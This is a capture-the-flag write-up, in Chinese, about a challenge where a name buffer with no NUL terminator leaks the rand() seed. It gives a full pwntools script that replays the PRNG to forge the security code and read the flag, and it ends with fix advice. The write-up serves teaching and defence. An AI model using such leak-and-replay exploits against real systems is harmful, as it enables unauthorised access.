# 字符串和随机数

## 题目简述

全局变量依次为 `name[0x20]`、四字节 `seed` 和 `pass[0x20]`。程序用 `read(0, name, 0x20)` 恰好读满姓名缓冲区，不会自动补 NUL；随后却用 `%s` 输出 `name`，导致打印越过数组并泄露相邻的随机种子。取得种子后，可用题目提供的同版本 libc 重放 `rand()` 序列并计算验证码。

## 解题过程

先发送以 `admin` 开头且正好 32 字节的姓名，以通过 `strncmp(name, "admin", 5)` 并让字符串没有终止符；密码使用源码中的固定值。欢迎语会先输出完整姓名，紧随其后的四字节就是 `seed`。

程序使用该种子调用 `srand(seed)`，随后验证码计算为：

```c
arg1 = rand() ^ 0xd0e0a0d0;
arg2 = rand() ^ 0x0b0e0e0f;
challenge = (arg1 ^ arg2) % 1000000;
```

`rand()` 的实现与 libc 版本有关，因此直接加载题目附件中的 `libc.so.6` 重放最稳妥：

```python
from ctypes import CDLL
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/pwn")
clib = CDLL("../dist/libc.so.6")

name = b"admin".ljust(0x20, b"A")
io.sendafter(b"Name: ", name)
io.sendafter(b"Password: ", b"1s_7h1s_p9ss_7tuIy_sAf3?")

io.recvuntil(name)
seed = u32(io.recvn(4))
clib.srand(seed)
arg1 = clib.rand() ^ 0xD0E0A0D0
arg2 = clib.rand() ^ 0x0B0E0E0F
challenge = (arg1 ^ arg2) % 1000000

io.sendlineafter(b"Wanna see it?", b"y")
io.sendlineafter(
    b"Input the security code to continue: ",
    str(challenge).encode(),
)
io.interactive()
```

验证通过后，程序输出保存在全局 `flag` 缓冲区中的邮件内容。

## 方法总结

`read` 不提供 C 字符串终止保证，而 `%s` 会一直读取到 NUL，这种接口语义不匹配会造成越界泄露。伪随机数也不具备密码学安全性：只要种子和具体实现可知，后续序列即可完全复现。修复时应为输入预留并手动写入终止符，敏感挑战值则使用密码学安全随机源。
